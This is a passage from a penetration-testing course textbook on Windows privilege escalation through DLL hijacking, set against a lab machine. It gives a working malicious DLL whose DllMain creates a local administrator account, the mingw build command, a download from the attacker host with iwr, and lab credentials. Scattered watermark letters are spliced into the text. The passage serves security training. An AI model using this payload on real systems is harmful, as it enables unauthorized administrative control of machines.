binaries, we’ll need to adapt with a more advanced way of abusing Windows services.
Dynamic Link Libraries (DLL)797 provide functionality to programs or the Windows operating
system. DLLs contain code or resources, such as icon files, for other executable files or objects to
use. These libraries provide a way for developers to use and integrate already existing
797 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 507
Made in Morocco
Penetration Testing with Kali Linux
functionality without reinventing the wheel. Windows uses DLLs to store functionality needed by
several components. Otherwise, each component would need the functionality in their own
source code resulting in a huge resource waste. On Unix systems, these files are called Shared
Objects.798
There are several methods we can use to exploit how DLLs work on Windows and they can often
be an effective way of elevating our privileges. One method is similar to the privilege escalation
vector performed in the previous section. Instead of overwriting the binary, we merely overwrite a
DLL the service binary uses. However, the service may not work as expected because the actual
DLL functionality is missing. In most cases, this would still lead us to code execution of the DLL’s
code and then, for example, to the creation of a new local administrative user.
Another method is to hijack the DLL search order.799 The search order is defined by Microsoft and
determines what to inspect first when searching for DLLs. By default, all current Windows
versions have safe DLL search mode enabled. y
This setting was implemented by Microsoft due to the high number of DLL hijacking vectors and
k
ensures that DLLs are more difficult to hijack. The following listing shows the standard search
order taken from the Microsoft Documentation:800
s
1. The directory from which the application loaded.
2. The system directory.
o
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
n
6. The directories that are listed in the PATH environment variable.
Listing 427 - Standard DLL search order on current Windows versions
i
Windows first searches the application’s directory. Interestingly, the current directory is at
z
position 5. When safe DLL search mode is disabled, the current directory is searched at position 2
after the application’s directory.
D
A special case of this method is a missing DLL. This means the binary attempted to load a DLL
that doesn’t exist on the system. This often occurs with flawed installation processes or after
updates. However, even with a missing DLL, the program may still work with restricted
functionality.
To exploit this situation, we can try placing a malicious DLL (with the name of the missing DLL) in
a path of the DLL search order so it executes when the binary is started.
Let’s show how we can abuse a missing DLL in an example by connecting to CLIENTWK220 with
RDP as steve and password securityIsNotAnOption++++++. We’ll start PowerShell and enumerate
the services as we did in the previous section. One finding we skipped is the service BetaService.
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select
Name,State,PathName | Where-Object {$_.State -like 'Running'}
Name State PathName
798 (Oracle Documentation, 2022), https://docs.oracle.com/cd/E19120-01/open.solaris/819-0690/6n33n7f8u/index.html
799 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order
800 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 508
Made in Morocco
Penetration Testing with Kali Linux
---- ----- --------
...
BetaService Running C:\Users\steve\Documents\BetaServ.exe
...
Listing 428 - Displaying information about the running service BetaService
Let’s check our permissions on the binary file of the service.
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
BUILTIN\Administrators:(F)
CLIENTWK220\steve:(RX)
CLIENTWK220\offsec:(F)
Successfully processed 1 files; Failed processing 0 files
Listing 429 - Displaying permissions on the binary of BetayService
Listing 429 shows that we don’t have permissions to replace the binary since we only have Read
and Execute permissions as steve. Therefore, we need to invesktigate a bit more.
We can use Process Monitor801 to display real-time information about any process, thread, file
s
system, or registry related activities. Our goal is to identify all DLLs loaded by BetaService as well
as detect missing ones. Once we have a list of DLLs used by the service binary, we can check
their permissions and if they can be replaced witho a malicious DLL. Alternatively, if find that a DLL
is missing, we could try to provide our own DLL by adhering to the DLL search order.
n
Unfortunately, we need administrative privileges to start Process Monitor and collect this data.
However, the standard procedure in a penetration test would be to copy the service binary to a
local machine. On this system, we can install the service locally and use Process Monitor with
i
administrative privileges to list all DLL activity.
z
In this example, we’ll simulate this step by starting Process Monitor as backupadmin. We can
browse in the Windows ExDplorer to C:\tools\Procmon\ and double-click on Procmon64.exe. A
window will appear asking us for administrative user credentials as shown in the following figure.
Once we enter the password admin123admin123! for backupadmin and accept the terms, the
program starts.
801 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 509
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
Figure 239: Appearing Prompt for UAC
Without any filters, the information providned by Process Monitor can be quite overwhelming.
Multiple new list entries are added every second. For now, we are only interested in events related
to the process BetaServ of the target service, so we can create a filter to only include events
i
related to it. For this, we’ll click on the Filter menu > Filter… to get into the filter configuration.
z
The filter consists of four conditions. Our goal is that Process Monitor only shows events related
to the BetaServ Process. WDe enter the following arguments: Process Name as Column, is as
Relation, BetaServ.exe as Value, and Include as Action. Once entered, we’ll click on Add.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 510
Made in Morocco
Penetration Testing with Kali Linux
Figure 240: Add Filter for BetaServ.exe
After applying the filter, the list is empty. In order to analyze the service binary, we should try
restarting the service as the binary will then attempt to load the DLLs.
In PowerShell, we enter Restart-Service802 with BetaService as argument, while Process Monitor is
running in the background.
PS C:\Users\steve> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
Listing 430 - Restarting BetaService
Listing 430 shows that we could successfully restart BetaService.
Checking Process Monitor, we notice that numerous events appeared. Scrolling down in the list,
various CreateFile calls can be found in the Operation column. The CreateFile function can be
y
used to create or open a file.
k
s
o
n
i
z
D
Figure 241: Add Filter for BetaServ.exe
Figure 241 shows that the CreateFile calls attempted to open a file named myDLL.dll in several
paths. The Detail column states NAME NOT FOUND for these calls, which means that a DLL with
this name couldn’t be found in any of these paths.
The consecutive function calls follow the DLL search order from Listing 427, starting with the
directory the application is located in and ending with the directories in the PATH environment
variable. We can confirm this by displaying the contents of this environment variable with
$env:path in PowerShell.
PS C:\Users\steve> $env:path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPow
erShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\Wind
owsApps;
Listing 431 - Display the PATH environment variable
802 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-
us/powershell/module/microsoft.powershell.management/restart-service?view=powershell-7.2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 511
Made in Morocco
Penetration Testing with Kali Linux
The directories in the PATH environment variable match the paths used in the CreateFile calls
recorded by Process Monitor.
So far, we know that the service binary tries to locate a file called myDLL.dll, but fails to do so. To
abuse this, we can attempt to write a DLL file with this name to a path used by the DLL search
order. The first call attempts to locate the DLL in the Documents folder of steve. Because it’s a
home directory of steve, we have permissions to write to this folder and can place a malicious
DLL there then restart the service to load it.
Before we create a DLL, let’s briefly review how attaching a DLL works and how it may lead us to
code execution. Each DLL can have an optional entry point function named DllMain, which is
executed when processes or threads attach the DLL. This function generally contains four cases
named DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
DLL_PROCESS_DETACH. These cases handle situations when the DLL is loaded or unloaded by a
process or thread. They are commonly used to perform initializatioyn tasks for the DLL or tasks
related to exiting the DLL. If a DLL doesn’t have a DllMain entry point function, it only provides
resources.
k
The following listing shows us a code example803 from Microsoft, outlining a basic DLL in C++804
containing these four cases. The DLL code contains tshe entry point function DllMain and the
previously mentioned cases in a switch statement. Depending on the value of ul_reason_for_call
one of these cases gets executed. As of now, all caoses only use a break statement.
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module n
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{ i
switch ( ul_reason_for_calzl )
{
case DLL_PROCESS_ATTACH: // A process is loading the DLL.
D
break;
case DLL_THREAD_ATTACH: // A process is creating a new thread.
break;
case DLL_THREAD_DETACH: // A thread exits normally.
break;
case DLL_PROCESS_DETACH: // A process unloads the DLL.
break;
}
return TRUE;
}
Listing 432 - Code example of a basic DLL in C++
The provided comments from Microsoft state that DLL_PROCESS_ATTACH is used when a
process is loading the DLL. Since the target service binary process in our example tries to load the
DLL, this is the case we need to add our code to.
Let’s reuse the C code from the previous section by adding the include statement as well as the
system function calls to the C++ DLL code. Additionally, we need to use an include statement for
803 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-
library#the-dll-entry-point
804 (Wikipedia, 2022), https://en.wikipedia.org/wiki/C%2B%2B
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 512
Made in Morocco
Penetration Testing with Kali Linux
the header file windows.h, since we use Windows specific data types such as BOOL. The final
code is shown in the following listing.
#include 
#include 
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
switch ( ul_reason_for_call )
{
case DLL_PROCESS_ATTACH: // A process is loading the DLL.
int i;
i = system ("net user dave2 password123! /add"); y
i = system ("net localgroup administrators dave2 /add");
break;
k
case DLL_THREAD_ATTACH: // A process is creating a new thread.
break;
case DLL_THREAD_DETACH: // A thread exits normally.
s
break;
case DLL_PROCESS_DETACH: // A process unloads the DLL.
break; o
}
return TRUE;
} n
Listing 433 - C++ DLL example code from Microsoft
Now, let’s cross-compile the code wiith mingw. We use the same command as in the previous
section but change the input codez file, the output name, and add --shared to specify that we want
to build a DLL.
D
kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
Listing 434 - Cross-Compile the C++ Code to a 64-bit DLL
Once the DLL is compiled, we can transfer it to CLIENTWK220. We can start a Python3 web
server on Kali in the directory the DLL is located in and use iwr in a PowerShell window on the
target machine. Before we download the file, we change our current directory to the Documents
folder of steve to download it into the correct directory for our attack. Additionally, we confirm
that dave2 doesn’t exist yet on the system with the net user command.
PS C:\Users\steve> cd Documents
PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile
myDLL.dll
PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator BackupAdmin dave
daveadmin DefaultAccount Guest
offsec steve WDAGUtilityAccount
The command completed successfully.
Listing 435 - Download compiled DLL
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 513
Made in Morocco
Penetration Testing with Kali Linux
myDLL.dll is now located in the Documents folder of steve, which is the first path in the DLL
search order. After we restart BetaService, our DLL should be loaded into the process and the
code to create the user dave2 as member of the local Administrators group in
DLL_PROCESS_ATTACH should be executed.
PS C:\Users\steve\Documents> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
WARNING: Waiting for service 'BetaService (BetaService)' to start...
PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator BackupAdmin dave
dave2 daveadmin DefaultAccount
Guest offsec steve y
WDAGUtilityAccount
The command completed successfully.
k
PS C:\Users\steve\Documents> net localgroup administrators
... s
Administrator
BackupAdmin
o
dave2
daveadmin
offsec
n
The command completed successfully.
Listing 436 - Restart the service BetaService and confirm dave2 was created as local administrator
i
Listing 436 shows that dave2 was created and added to the local Administrators group, once the
z
service is restarted. Excellent!
Let’s briefly summarize what we did in this section. Through the information obtained from
D
Process Monitor, we identified that the binary from BetaService tried to load myDLL.dll. Because
the service binary is located in the Documents folder of steve, we could write to this directory,
which is also the first directory of the DLL search order specified by Microsoft. Because of this,
our malicious DLL was loaded and executed once the service was restarted.
16.2.3 Unquoted Service Paths
Another interesting attack vector that can lead to privilege escalation on Windows operating
systems revolves around unquoted service paths.805 We can use this attack when we have Write
permissions to a service’s main directory or subdirectories but cannot replace files within them.
As we learned in the previous sections, each Windows service maps to an executable file that will
be run when the service is started. If the path of this file contains one or more spaces and is not
enclosed within quotes, it may be turned into an opportunity for a privilege escalation attack.